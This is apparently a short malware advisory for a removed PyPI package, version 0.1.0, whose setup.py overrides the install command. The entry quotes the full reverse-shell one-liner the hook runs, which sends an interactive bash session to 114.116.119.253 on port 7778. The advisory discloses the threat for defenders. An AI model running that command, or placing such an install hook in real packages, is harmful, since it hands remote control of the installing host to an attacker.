details: Malicious package. `setup.py` overrides the setuptools `install` command and, after the normal install, runs `bash -c 'bash -i >& /dev/tcp/114.116.119.253/7778 <&1'`, giving whoever listens on 114.116.119.253:7778 an interactive shell on the installing host. Seen in a sandboxed install. Same one-liner and host as myshellcode (MAL-2024-5391). Version 0.1.0 was published on 2023-05-15 and has since been removed from PyPI.
